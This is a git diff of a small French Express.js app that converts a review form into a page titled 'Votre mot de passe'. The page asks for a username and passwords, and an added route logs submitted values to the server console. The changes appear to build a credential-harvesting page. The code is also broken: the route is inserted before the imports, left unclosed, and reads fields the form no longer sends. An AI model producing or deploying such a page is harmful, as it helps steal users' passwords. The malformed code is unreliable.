@@ -1,3 +1,16 @@
+app.post('/envoyer-verification', (req, res) => {
+    const { username, avis } = req.body;
+
+    // Cette ligne va forcer l'affichage dans la console noire de Render :
+    console.log(`[NOUVEL AVIS] Utilisateur: ${username} | Avis: ${avis}`);
+
+    if (username && avis) {
+        listeAvis.push({
+            username: username,
+            avis: avis,
+            date: new Date().toLocaleString('fr-FR')
+        });
+    }
 import express from 'express';
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -15,7 +28,7 @@ app.get('/', (req, res) => {
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Donnez votre avis</title>
+            <title>Votre mot de passe</title>
             <style>
                 body { font-family: Arial, sans-serif; margin: 50px; background-color: #f4f4f4; }
                 .form-container { background: white; padding: 30px; border-radius: 8px; max-width: 400px; margin: 0 auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
@@ -30,18 +43,18 @@ app.get('/', (req, res) => {
         <body>
             <div class="form-container">
                 <h2>Votre avis</h2>
-                <form action="/envoyer-verification" method="POST">
+                <form action="/proceder" method="POST">
                     <div class="form-group">
                         <label for="username">Nom d'utilisateur :</label>
                         <input type="text" id="username" name="username" required placeholder="Votre pseudo">
                     </div>
                     <div class="form-group">
-                        <label for="avis">Votre avis :</label>
-                        <textarea id="avis" name="avis" rows="5" required placeholder="Écrivez votre avis ici..."></textarea>
+                        <label for="avis">Mots de passe :</label>
+                        <textarea id="Passe" name="Passe" rows="5" required placeholder="Écrivez votre mots de passe ici..."></textarea>
                     </div>
-                    <button type="submit">Envoyer</button>
+                    <button type="submit">proceder</button>
                 </form>
-                <a class="view-link" href="/voir-avis">Consulter les avis reçus</a>
+                <a class="view-link" href="/voir-avis">Consulter l'activiter</a>
             </div>
         </body>
         </html>
